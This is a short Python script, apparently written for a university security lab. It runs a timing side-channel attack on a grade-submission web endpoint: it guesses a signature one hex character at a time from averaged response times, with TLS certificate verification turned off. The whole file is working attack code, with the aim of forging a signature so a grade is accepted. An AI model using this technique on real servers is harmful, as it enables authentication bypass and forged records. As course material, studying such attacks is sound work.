import string
import time
import urllib.request
import ssl


hexa = string.hexdigits[:16]
sig = list("68230000000000000000")
bestTime = 0
def buildurl(name,sige,grade):
    return "https://eitn41.eit.lth.se:3119/ha4/addgrade.php?name={}&grade={}&signature={}".format(name,grade,"".join(sige))

print(len(sig))
print(hexa)
x = hexa[0]
print(x)
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE #Python/min dator/manjaro gillar inte ert certifikat, kan ju lika gärna vara NSA som lyssnar nu!11!

#name = input("Name: ")
#grade = input("Grade: ")
name = "Kalle"
grade = "5"
for i in range(4, 20):
    testsig = list(sig)

    for k in hexa:
        testsig[i] = k
        curTime  = 0
        print("HAXXXING IN PROGRESS: ","".join(testsig), "\r",end='')
        urllib.request.urlopen(buildurl(name,testsig,grade), context=ctx)
        for z in range(0,40):
            start = time.clock()
            #urllib.urlopen(buildurl(name,testsig,grade), context=ctx).read()
            #print(buildurl(name,testsig,grade))
            urllib.request.urlopen(buildurl(name,testsig,grade), context=ctx)
            stop = time.clock()
            curTime = curTime + (stop-start)
        curTime = curTime/40
        print(curTime)
        if curTime > bestTime:
                bestTime = curTime
                best = k

    sig[i] = best
    bestTime = 0
print("HAXXXING COMPLETE: ",print(buildurl(name,sig,grade)))
